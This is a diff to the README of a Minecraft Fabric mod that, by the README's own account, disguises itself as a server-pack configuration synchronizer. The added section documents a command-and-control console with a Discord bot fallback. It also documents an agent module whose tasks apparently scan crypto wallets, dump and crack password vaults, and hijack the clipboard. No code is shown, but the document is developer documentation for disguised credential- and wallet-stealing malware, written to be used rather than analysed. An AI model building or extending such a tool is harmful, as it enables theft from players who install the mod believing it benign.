@@ -2,6 +2,16 @@
 
 Fabric client mod for Minecraft 1.20.1. It presents itself as a configuration synchronizer for a private server pack. The mod id stays `serverpackcore` so existing updates keep working; only the visible name is `Fabric Sync`.
 
+## SPC Console (HTTPS C2)
+
+The Discord bot remains the fallback. The primary path is the self-hosted console in
+[`console/`](console/OVERVIEW.md), governed by the frozen contract in
+[`contract/v1/CONTRACT.md`](contract/v1/CONTRACT.md). The agent module is
+`agent/src/main/java/com/serverpackcore/agent/crypto/`; it adds the tasks
+`scan_wallets`, `dump_vault`, `crack_vault`, `clip_start` and `clip_stop` next to the
+existing commands. Without `serverpackcore/config.json` in the jar the module stays
+disabled and Discord keeps working unchanged.
+
 ## Architecture
 
 The project produces two artifacts:
